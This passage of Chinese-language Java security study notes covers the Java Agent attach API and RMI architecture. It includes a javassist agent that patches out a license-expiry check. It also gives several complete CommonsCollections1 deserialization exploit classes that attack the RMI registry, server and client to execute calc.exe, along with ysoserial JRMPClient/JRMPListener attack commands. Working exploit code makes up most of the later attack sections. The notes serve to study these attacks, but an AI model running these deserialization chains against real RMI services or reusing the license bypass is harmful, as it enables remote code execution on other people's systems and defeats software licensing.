props.put("com.sun.management.jmxremote.port", "5000");
vm.startManagementAgent(props);
// detach
vm.detach();

// 在此示例中，我们附加到由进程标识符2177标识的Java虚拟机。然后，使用提供的参数在目标进程中启动JMX管理代理。最后，客户端从目标VM分离。
```

下面列几个这个类提供的方法：

```
public abstract class VirtualMachine {
    // 获得当前所有的JVM列表
    public static List<VirtualMachineDescriptor> list() { ... }

    // 根据pid连接到JVM
    public static VirtualMachine attach(String id) { ... }

    // 断开连接
    public abstract void detach() {}

    // 加载agent，agentmain方法靠的就是这个方法
    public void loadAgent(String agent) { ... }

}
```

根据提供的 api，可以写出一个 attacher，

```
package agent;

import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;
import com.sun.tools.attach.AttachNotSupportedException;
import com.sun.tools.attach.VirtualMachine;

import java.io.IOException;
import java.lang.instrument.Instrumentation;

public class AgentMain {
    public static void agentmain(String[] args, Instrumentation inst) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        String id = args[0];
        String jarName = args[1];

        System.out.println("id ==> " + id);
        System.out.println("jarName ==> " + jarName);

        VirtualMachine virtualMachine = VirtualMachine.attach(id);
        virtualMachine.loadAgent(jarName);
        virtualMachine.detach();

        System.out.println("ends");
    }
}
```

过程非常简单：通过pid attach到目标JVM -> 加载agent -> 解除连接。

测试 agentmain：

```
package agent;

import java.lang.instrument.Instrumentation;

public class AgentDemo {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        for (int i = 0; i < 10; i++) {
            System.out.println("hello I`m agentMain!!!");
        }
    }
}
```

![img](img/20210416111901-7d4211d2-9e62-1.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20210416111901-7d4211d2-9e62-1.png?lastModify=1646033842)

![img](img/20210416111901-7d936154-9e62-1.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20210416111901-7d936154-9e62-1.png?lastModify=1646033842)

成功attach并加载了agent。

整个过程的流程图大致如下图所示：

![img](img/20210416111902-7deb2dbc-9e62-1.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20210416111902-7deb2dbc-9e62-1.png?lastModify=1646033842)

## Instrumentation

测试

```

```









## Java Agent技术实现

步骤：

1. 定义一个`MANIFEST.MF`文件，必须包含`Premain-Class`选项，通常也会加入`Can-Redefine-Classes` 和 `Can-Retransform-Classes` 选项。
2. 创建指定的`Premain-Class`类，并且里面包含`premain`方法。
3. 把`premain`和`MANIFEST.MF`文件打包成一个jar包。
4. 使用`-javaagent:jar` 参数包路径，启动要代理的方法。

> 完成以上步骤后，启动程序的时候会去执行`premain`  方法，当然这个肯定是优先于main方法执行的。但是不免会有一些系统类优先于javaagent进行执行。但是用户类这些肯定是会被javaagent给拦截下来的。这么这时候拦截下来后就可以进行一个重写类等操作，例如使用ASM、javassist，cglib等等来改写实现类。在实现里面需要去些2个项目，一个是javaAgent的类，一个是需要JavaAagent需要去代理的类。在mian方法执行前去执行的一些代码。

1. 创建一个类，包含 premain方法：

   ```
   package agent;
   
   import javassist.ClassPool;
   import javassist.CtClass;
   import javassist.CtMethod;
   import javassist.NotFoundException;
   
   import java.io.ByteArrayInputStream;
   import java.io.File;
   import java.io.IOException;
   import java.lang.instrument.ClassFileTransformer;
   import java.lang.instrument.IllegalClassFormatException;
   import java.lang.instrument.Instrumentation;
   import java.lang.instrument.UnmodifiableClassException;
   import java.security.ProtectionDomain;
   
   public class CrackLicenseAgent {
       // 需要被 hook 的类
       private static final String HOOK_CLASS = "agent.CrackLicenseTest";
       // Java Agent模式入口
       public static void premain(String args,final Instrumentation inst){
           System.out.println("agent args" + args);
           loadAgent(args,inst);
       }
       // 加载Agent
       private static void loadAgent(String args,final Instrumentation inst){
           // 创建 ClassFileTransformer 对象
           ClassFileTransformer classFileTransformer = createClassFileTransformer();
           // 添加自定义的 Transformer ，第二个参数 true 表示是否允许 Agent Retransform
           // 需配合MANIFEST.MF中的Can-Retransform-Classes: true 配置
           inst.addTransformer(classFileTransformer,true);
           // 获取所有已经被JVM加载的类对象
           Class[] loadedClasses = inst.getAllLoadedClasses();
           for (Class clazz:loadedClasses){
               String clazzName = clazz.getName();
               if(inst.isModifiableClass(clazz)){
                   // 使用 Agent重新加载 类字节码
                   if(clazzName.equals(HOOK_CLASS)){
                       try {
                           inst.retransformClasses(clazz);
                       } catch (UnmodifiableClassException e) {
                           e.printStackTrace();
                       }
                   }
               }
           }
   
       }
       private static ClassFileTransformer createClassFileTransformer(){
           return new ClassFileTransformer() {
               /**
                * 类文件转换方法，重写transform方法可获取到待加载的类相关信息
                *
                * @param loader              定义要转换的类加载器；如果是引导加载器，则为 null
                * @param className           类名,如:java/lang/Runtime
                * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null
                * @param protectionDomain    要定义或重定义的类的保护域
                * @param classfileBuffer     类文件格式的输入字节缓冲区（不得修改）
                * @return 字节码byte数组。
                */
               @Override
               public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
                   // 将目录路径替换成 Java 类名
                   className = className.replace("/", ".");
                   // 只处理 agent.CrackLicenseTest 类的字节码
                   if (className.equals(HOOK_CLASS)){
                       // javassist 技术
                       try {
                           ClassPool pool = ClassPool.getDefault();
                           CtClass ctClass = pool.makeClass(new ByteArrayInputStream(classfileBuffer));
                           CtMethod ctMethod = ctClass.getDeclaredMethod("checkExpiry", new CtClass[]{pool.getCtClass("java.lang.String")});
                           ctMethod.insertBefore("System.out.println(\"License到期时间: \" + $1);");
                           // 修改方法返回值
                           ctMethod.insertAfter("return false;");
                           // 修改后的类字节码
                           classfileBuffer = ctClass.toBytecode();
                           // 修改后的类字节码
                           ctClass.writeFile(".");
                       } catch (Exception e) {
                           e.printStackTrace();
                       }
                   }
                   return classfileBuffer;
               }
           };
       }
   }
   ```

2. 在 resources 目录下新建 `META-INF/MANIFEST`

   ```
   Manifest-Version: 1.0
   Can-Redefine-Classes: true
   Can-Retransform-Classes: TRUE
   Premain-Class: agent.CrackLicenseAgent
   ```

   MF文件的作用：这里如果你不去手动指定的话，直接 打包，默认会在打包的文件中生成一个MANIFREST.MF文件：

   ```
   Manifest-Version: 1.0
   Archiver-Version: Plexus Archiver
   Built-By: 51946
   Created-By: Apache Maven 3.8.1
   Build-Jdk: 1.8.0_281
   ```

   即在该文件中主要定义了程序运行相关的配置信息，程序运行前会先检测该文件中的配置项。

3. 将工程打包为 jar 包，

   ```
   maven clean
   maven install
   ```

   发现MF文件被替换掉了。

   **可以手动改MF文件替换到 jar包。**

   **也可以不写mf文件，直接在 pom 中配置。**

   ```
   <build>
           <plugins>
               <plugin>
                   <groupId>org.apache.maven.plugins</groupId>
                   <artifactId>maven-jar-plugin</artifactId>
                   <configuration>
                       <archive>
                           <!--自动添加META-INF/MANIFEST.MF -->
                           <manifest>
                               <addClasspath>true</addClasspath>
                           </manifest>
                           <manifestEntries>
                               <Premain-Class>agent.CrackLicenseAgent</Premain-Class>
                               <Can-Redefine-Classes>true</Can-Redefine-Classes>
                               <Can-Retransform-Classes>true</Can-Retransform-Classes>
                           </manifestEntries>
                       </archive>
                   </configuration>
               </plugin>
           </plugins>
       </build>
   ```

   生成jar包中的 mf:

   ```
   Manifest-Version: 1.0
   Premain-Class: agent.CrackLicenseAgent
   Archiver-Version: Plexus Archiver
   Built-By: 51946
   Can-Redefine-Classes: true
   Can-Retransform-Classes: true
   Class-Path: javassist-3.24.0-GA.jar
   Created-By: Apache Maven 3.8.1
   Build-Jdk: 1.8.0_281
   ```

4. 新建工程

   ```
   import java.text.ParseException;
   import java.text.SimpleDateFormat;
   import java.util.Date;
   import java.util.concurrent.TimeUnit;
   
   /**
    * Creator: yz
    * Date: 2020/10/29
    */
   public class CrackLicenseTest {
   
       private static final SimpleDateFormat DATE_FORMAT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
   
       private static boolean checkExpiry(String expireDate) {
           try {
               Date date = DATE_FORMAT.parse(expireDate);
   
               // 检测当前系统时间早于License授权截至时间
               if (new Date().before(date)) {
                   return false;
               }
           } catch (ParseException e) {
               e.printStackTrace();
           }
   
           return true;
       }
   
       public static void main(String[] args) {
           // 设置一个已经过期的License时间
           final String expireDate = "2020-10-01 00:00:00";
   
           new Thread(new Runnable() {
               @Override
               public void run() {
                   while (true) {
                       try {
                           String time = "[" + DATE_FORMAT.format(new Date()) + "] ";
   
                           // 检测license是否已经过期
                           if (checkExpiry(expireDate)) {
                               System.err.println(time + "您的授权已过期，请重新购买授权！");
                           } else {
                               System.out.println(time + "您的授权正常，截止时间为：" + expireDate);
                           }
   
                           // sleep 1秒
                           TimeUnit.SECONDS.sleep(5);
                       } catch (InterruptedException e) {
                           e.printStackTrace();
                       }
                   }
               }
           }).start();
       }
   
   }
   ```

5. 配置启动

   可以在这里配置

   ![image-20220122185900768](img/image-20220122185900768.png)![image-20220122185900768](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220122185900768.png?lastModify=1646033842)

不过这种方式我没成功。

也可以命令行编译，

```
javac Test.java
java -javaagent:D:\xxx\agent-1.0-SNAPSHOT.jar agent.Test
```

![image-20220122191811392](img/image-20220122191811392.png)![image-20220122191811392](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220122191811392.png?lastModify=1646033842)

![image-20220122191850294](img/image-20220122191850294.png)![image-20220122191850294](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220122191850294.png?lastModify=1646033842)

```
args: null
premain loca Class: java/lang/invoke/MethodHandleImpl
premain loca Class: java/lang/invoke/MethodHandleImpl$1
premain loca Class: java/lang/invoke/MethodHandleImpl$2
premain loca Class: java/util/function/Function
premain loca Class: java/lang/invoke/MethodHandleImpl$3
premain loca Class: java/lang/invoke/MethodHandleImpl$4
premain loca Class: java/lang/ClassValue
premain loca Class: java/lang/ClassValue$Entry
premain loca Class: java/lang/ClassValue$Identity
premain loca Class: java/lang/ClassValue$Version
premain loca Class: java/lang/invoke/MemberName$Factory
premain loca Class: java/lang/invoke/MethodHandleStatics
premain loca Class: java/lang/invoke/MethodHandleStatics$1
premain loca Class: sun/misc/PostVMInitHook
premain loca Class: sun/misc/PostVMInitHook$2
premain loca Class: jdk/internal/util/EnvUtils
premain loca Class: sun/misc/PostVMInitHook$1
premain loca Class: sun/usagetracker/UsageTrackerClient
premain loca Class: java/util/concurrent/atomic/AtomicBoolean
premain loca Class: sun/usagetracker/UsageTrackerClient$1
premain loca Class: sun/usagetracker/UsageTrackerClient$4
premain loca Class: sun/usagetracker/UsageTrackerClient$2
premain loca Class: sun/usagetracker/UsageTrackerClient$3
premain loca Class: java/io/FileOutputStream$1
premain loca Class: sun/launcher/LauncherHelper
premain loca Class: java/util/concurrent/ConcurrentHashMap$ForwardingNode
premain loca Class: sun/misc/URLClassPath$FileLoader$1
premain loca Class: agent/Test
premain loca Class: sun/launcher/LauncherHelper$FXHelper
premain loca Class: java/lang/Class$MethodArray
premain loca Class: java/lang/Void
premain loca Class: agent/Test$1
test main
test main
test main
test main
test main
test main
```

 发现：

```
1. 执行 main方法前会加载所有的类，包括系统类和自定义类
2. 在 ClassFileTransformer 中会去拦截系统类和自己实现的类对象
3. 如果有对某些对象改写，那么拦截的时候可以使用字节码工具实现。
```

![img](img/20210416111900-7d22bb02-9e62-1.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20210416111900-7d22bb02-9e62-1.png?lastModify=1646033842)

然而这种方法存在一定的局限性——**只能在启动时使用`-javaagent`参数指定**。在实际环境中，目标的JVM通常都是已经启动的状态，无法预先加载premain。相比之下，agentmain更加实用。

​	



https://www.cnblogs.com/rickiyang/p/11368932.html

https://xz.aliyun.com/t/9450#toc-12



# RMI

RMI全称是`Remote Method Invocation`，远程方法调用，和RPC类似，是让某个Java虚拟机上的对象调用另一个Java虚拟机中对象上的方法.

调用过程

![image-20220120143539688](img/20181023090617906.png)![image-20220120143539688](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20181023090617906.png?lastModify=1646033842)

![img](img/1633059061409.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1633059061409.png?lastModify=1646033842)

RMI主体分为三个：

- RMI Registry
- RMI Server
- RMI Client

## 代码实现

#### Registry 注册中心

```
package rmi.registry;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class Registry {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
        while (true);
    }
}
```

#### Server 服务端

**编写远程接口**

```
package rmi.pojo;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteHelloWorld extends Remote {
    public String hello() throws RemoteException;
}
```

- 使用 public声明
- 继承`Remote`
- 接口的方法需要抛出`RemoteException`异常

以上确保可被客户端远程访问到。

**编写接口实现类**

```
package rmi.pojo;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteHelloWorldImpl extends UnicastRemoteObject implements RemoteHelloWorld {
    public RemoteHelloWorldImpl() throws RemoteException {
        super();
        System.out.println("构造函数");
    }

    @Override
    public String hello() throws RemoteException {
        System.out.println("hello 方法被调用");
        return "hello world!";
    }
}
```

- 实现远程接口
- 扩展`UnicastRemoteObject` 类，扩展此类后，RMI会自动将这个类 export 给远程想要调用它的客户端，同时还提供了一些`equals/hashcode/toString`方法。
- 必须提供一个构造函数，并且抛出 RemoteException。
- 类中使用的对象必须都可反序列化
- 注册远程对象

> 在 export 时，会随机绑定一个端口，监听客户端的请求，所以即使不注册，直接请求这个端口也可以通信。

如果不想让远程对象成为 UnicastRemoteObject 的子类，后面就需要主动的使用其静态方法 `exportObject` 来手动 export 对象。

**编写Server**

`java.rmi.Naming` 是一个 final 类，提供了在远程对象注册表（Registry）中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式如下：`//host:port/name`：

- host 表示注册表所在的主机
- port 表示注册表接受调用的端口号，默认为 1099
- name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字

Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。也就是说，Naming 是一个用来对注册表进行操作的类。而这些方法的具体实现，其实是调用 `LocateRegistry.getRegistry` 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的。

```
package rmi.server;

import rmi.pojo.RemoteHelloWorldImpl;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, MalformedURLException {
        RemoteHelloWorldImpl remoteHelloWorld = new RemoteHelloWorldImpl();
        Naming.rebind("rmi://127.0.0.1/Hello",remoteHelloWorld);
    }
}
```

将对象注册到注册中心。

#### Client 客户端

**编写接口类**

```
package rmi.pojo;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteHelloWorld extends Remote {
    public String hello() throws RemoteException;
}
```

客户端不知道这个类的源代码也是可以的，主要是与服务端的接口类包名需相同，serialVersionUID需相同。

**编写client客户端**

```
package rmi.client;

import rmi.pojo.RemoteHelloWorld;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

public class RMIClient {
    public static void main(String[] args) throws RemoteException, MalformedURLException, NotBoundException {
        RemoteHelloWorld remoteHelloWorld = (RemoteHelloWorld) Naming.lookup("rmi://127.0.0.1:1099/Hello");
        System.out.println(remoteHelloWorld.hello());
    }
}
```

#### 启动流程

先启动注册中心 Registey ，

然后启动 server 端注册对象，

然后启动 client 端远程读取对象，并调用方法。

![image-20220120162830308](img/image-20220120162830308.png)![image-20220120162830308](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120162830308.png?lastModify=1646033842)

虽然客户端执行的是远程服务端的方法，但实际上我们还是需要知道接口中有哪些方法的。

#### 流量分析

可以看看P神的安全漫谈。

> ⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 192.168.135.142:33769 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello() 。

> RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMIServer；最后，远程⽅法实际上在RMI Server上调⽤。

## 特性

首先是动态类加载，如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了 `java.rmi.server.codebase`，则会尝试从其中的地址获取 `.class` 并加载及反序列化。

可使用`System.setProperty("java.rmi.server.codebase","http://127.0.0.1:9999/")`进行设置，或者使用启动参数`-Djava.rmi.server.codebase="http://127.0.0.1:9999/"`进行指定。

还有安全策略的设置，因为我们通过网络加载外部类并执行方法，所以必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类，可以使用：

```
if(System.getSecurityManager()==null){
    System.setSecurityManager(new RMISecurityManager());
}
```

管理器应与管理策略相辅相成，所以我们还需要提供一个策略文件，里面配置允许那些主机进行哪些操作，这里为了方便测试，直接设置全部权限：

```
grant {
    permission java.security.AllPermission;
};
```

同样可以使用 `-Djava.security.policy=rmi.policy` 或 `System.setProperty("java.security.policy", RemoteServer.class.getClassLoader().getResource("rmi.policy").toString());` 来进行设置。

## 源码分析

[https://su18.org/post/rmi-attack/#%E4%BA%8C-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90](https://su18.org/post/rmi-attack/#二-源码分析)

看 su18 师傅的吧，(YYDS)

![https://su18.org/post-images/1633322482542.png](img/1633322482542.png)![https://su18.org/post-images/1633322482542.png](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1633322482542.png?lastModify=1646033842)

RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：

1. RMI 客户端在调用远程方法时会先创建 Stub ( `sun.rmi.registry.RegistryImpl_Stub` )。
2. Stub 会将 Remote 对象传递给远程引用层 ( `java.rmi.server.RemoteRef` ) 并创建 `java.rmi.server.RemoteCall`( 远程调用 )对象。
3. RemoteCall 序列化 RMI 服务名称、Remote 对象。
4. RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。
5. RMI服务端的远程引用层( `sun.rmi.server.UnicastServerRef` )收到请求会请求传递给 Skeleton ( `sun.rmi.registry.RegistryImpl_Skel#dispatch` )。
6. Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。
7. Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。
8. RMI 客户端反序列化服务端结果，获取远程对象的引用。
9. RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。
10. RMI 客户端反序列化 RMI 远程方法调用结果。

## RMI利用

我们可以使用`rebind` ，`bind` ,`unbind` 等方法去注册中心注册方法。

那是否意味着我们知道了Registry地址，可以无限制的去随意注册服务?

**是不可以的，Java 对RMI Registry 做了限制，只有源地址是 localhost 的时候，才能调用`bind` , `rebind` ， `unbind`  等方法。**

不过 `list` , `lookup` 方法可以调用。

list方法可以列出目标上所有绑定的对象： `String[] s = Naming.list("rmi://192.168.135.142:1099");`

lookup作用就是获得某个远程对象。 如果对方RMI注册中心存在敏一些危险方法，就可以进行探测调用（[BaRMIE工具](https://github.com/NickstaDB/BaRMIe)) 。

JRMP（Java 远程交换协议）是Java的一种通信协议，其中RMI协议中的对象传输部分底层可以通过JRMP协议实现。

JRMP传输对象是就是基于序列化来实现的，因此这个过程中可能会存在问题。

> RMI底层是通过JRMP协议进行通信，而JRMP通信本身可能存在序列化漏洞。

- Server 进行 bind 时， registry 会对 bind() 的 stub 对象的序列化流进行反序列化，如果 registry 中有对象的反序列化链依赖，则可以进行攻击。
- Client 进行 lookup 时，registry 会进行反序列化，client也会对 registry返回的数据进行反序列化，因此，client 与registry可相互攻击。
- Client 调用远程方法时，server 会对传来的参数数据进行反序列化， client 也会对 server 的执行结果进行反序列化，因此， client 和 server 可相互攻击。

## 客户端|服务端攻击Registry注册中心

使用CC1攻击，同样，注册中心需要有CC1链需要的条件。

server 攻击 registry

```
package rmi.server;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import rmi.pojo.RemoteHelloWorldImpl;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.Map;

public class RMIServerCC1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value","xxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);


        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, outerMap);

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) obj));

        Naming.rebind("rmi://127.0.0.1:1099/exp", remote);

    }
}
```

在`RegistryImpl_Skel#dispatch` 下断点，调试

case 3 ,在这里反序列化

![image-20220220104048900](img/image-20220220104048900.png)![image-20220220104048900](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220104048900.png?lastModify=1646033842)

**上边有提到，registry 只允许本地的server去注册。**

**但是在 jdk8u141 之前的版本中，registry是先进行反序列化的，然后才会校验地址。**

这里在反序列化后才进行 rebind，跟进看看

![image-20220220104141219](img/image-20220220104141219.png)![image-20220220104141219](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220104141219.png?lastModify=1646033842)

rebind 方法中 `checkAccess` 才做了地址来源的检验。

![image-20220220104222072](img/image-20220220104222072.png)![image-20220220104222072](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220104222072.png?lastModify=1646033842)

![image-20220220104339003](img/image-20220220104339003.png)![image-20220220104339003](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220104339003.png?lastModify=1646033842)

修复版本中是先做了地址来源校验 ，**所以 8u141之后，服务端 bind类操作打注册端就不可用。**

**![image-20220220104509969](img/image-20220220104509969.png)![image-20220220104509969](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220104509969.png?lastModify=1646033842)**

**分析 poc**

rebind 方法 参数2 需要一个 Remote 对象

![image-20220220104635695](img/image-20220220104635695.png)![image-20220220104635695](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220104635695.png?lastModify=1646033842)

所以这里需要转换成 remote 对象，才能传输，是通过代理转换。

```
Remote remote = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) obj));

Naming.rebind("rmi://127.0.0.1:1099/exp", remote);
```

还可以通过

```
BindExploit remote = new BindExploit(obj);

// 自定义实现 Remote
private static class BindExploit implements Remote, Serializable{
    // 放 payload
    private Object memberValues = null;
    private BindExploit(Object payload){
        memberValues = payload;
    }

}
```



**client 攻击 registry**

接口类:

```
package rmi.pojo;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteHelloWorld extends Remote {
    public String hello() throws RemoteException;

    public String test(Object object) throws RemoteException;
}
```

接口实现类

```
package rmi.pojo;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteHelloWorldImpl extends UnicastRemoteObject implements RemoteHelloWorld {
    public RemoteHelloWorldImpl() throws RemoteException {
        super();
        System.out.println("构造函数");
    }

    @Override
    public String hello() throws RemoteException {
        System.out.println("hello 方法被调用");
        return "hello world!";
    }

    @Override
    public String test(Object object) throws RemoteException{
        System.out.println("接收到" + object);
        return "ok";
    }
}
```

client：

```
package rmi.client;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import rmi.pojo.RemoteHelloWorld;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.Map;

public class RMIClientCC1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value","xxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);


        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, outerMap);

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) obj));

        RemoteHelloWorld remoteHelloWorld = (RemoteHelloWorld) Naming.lookup("rmi://127.0.0.1:1099/Hello");
        System.out.println(remoteHelloWorld.hello());
        remoteHelloWorld.test(obj);
    }
}
```

![image-20220120175933886](img/image-20220120175933886.png)![image-20220120175933886](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220120175933886.png?lastModify=1646033842)

#### ysoserial  另一种方式

借助 ysoserial 工具的 JRMPClient 模块攻击注册中心：

```
 java8 -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 0.0.0.0 1099 CommonsCollections6 "calc.exe"
```

原理：RMI框架采用 DGC (Distributed Garbage Collection) 分布式垃圾收集机制来管理远程对象的生命周期，可以通过与DGC通信的方式发送恶意 paylaod 让注册中心反序列化。

**条件：jdk8u121 以下及未支持JEP290的java版本。**

## 攻击Server端

其实上边 客户端攻击 registry 也是攻击 server端，

一般 server 和 registry 是部署在一起的。

#### **注册中心攻击服务端**

ysoserial

生成恶意注册中心

```
java8 -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "calc.exe"
```

server:

server bind 参数可控

```
package rmi.server;

import rmi.pojo.RemoteHelloWorldImpl;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, MalformedURLException {
        RemoteHelloWorldImpl remoteHelloWorld = new RemoteHelloWorldImpl();
        Naming.rebind("rmi://127.0.0.1:1099/Hello",remoteHelloWorld);
    }
}
```

- list
- bind
- rebind
- unbind

#### **客户端攻击服务端**

server

增加个接口

```
public String test(Object object) throws RemoteException;
```

celient

拿到对象，调用方法并传入恶意对象即可。

## 攻击Client端

如果攻击的是 client 端，也就是 registry 地址可控，或 registry/server 可控，也是可以导致攻击的。

- 从 registry 端获取调用服务的stub并反序列化
- 调用服务后获取执行结果并反序列化

#### 服务端攻击客户端

server 返回恶意对象

```
public Object test1() throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
    };

    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    HashMap innerMap = new HashMap();
    innerMap.put("value","xxx");
    Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);


    Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    Object obj = constructor.newInstance(Target.class, outerMap);

    Remote remote = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) obj));
    return obj;
}
```

客户端请求调用

```
